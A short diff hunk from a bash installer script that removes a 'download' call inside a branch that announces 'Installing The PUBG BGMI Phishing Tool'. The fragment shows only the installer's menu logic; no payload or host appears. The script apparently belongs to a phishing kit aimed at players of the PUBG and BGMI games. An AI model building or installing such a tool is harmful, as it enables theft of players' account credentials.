@@ -146,7 +146,6 @@ echo""
 if [[ $option == *'abcdeff12b476e48256775a4d69b65a'* ]]; then
 clear
 echo ""
-download
 echo ""
 echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
 echo ""
